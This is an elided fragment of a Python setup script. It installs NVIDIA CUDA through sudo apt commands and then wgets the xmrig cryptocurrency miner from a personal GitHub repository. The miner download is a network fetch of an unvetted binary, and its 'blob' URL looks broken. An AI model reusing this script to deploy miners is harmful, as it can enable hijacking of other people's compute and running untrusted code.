...
time.sleep(0.5)
os.system("sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/3bf863cc.pub")
os.system("wget -q https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin")
os.system("sudo add-apt-repository 'deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ /' ")
...
time.sleep(0.5)
os.system("sudo apt install cmake cuda -y")
time.sleep(0.5)
...
time.sleep(0.5)
os.system("wget -q https://github.com/Dev-Rizz/mine/blob/main/xmrig")
time.sleep(0.5)
